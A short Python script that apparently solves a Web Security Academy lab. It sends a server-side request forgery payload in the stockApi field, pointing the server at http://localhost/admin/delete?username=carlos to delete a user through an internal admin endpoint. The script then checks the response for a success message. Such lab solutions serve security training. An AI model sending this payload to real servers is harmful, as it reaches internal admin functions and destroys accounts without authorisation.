import requests


lab_id = '0acc00240323a6e481cd66c200cb0048' #change based on generated lab
uri = f"https://{lab_id}.web-security-academy.net/product/stock"

data = {'stockApi': 'http://localhost/admin/delete?username=carlos'}

r = requests.post(uri, data=data)
if "Congratulations" in r.text:
    print("solved")
else:
    print("nope")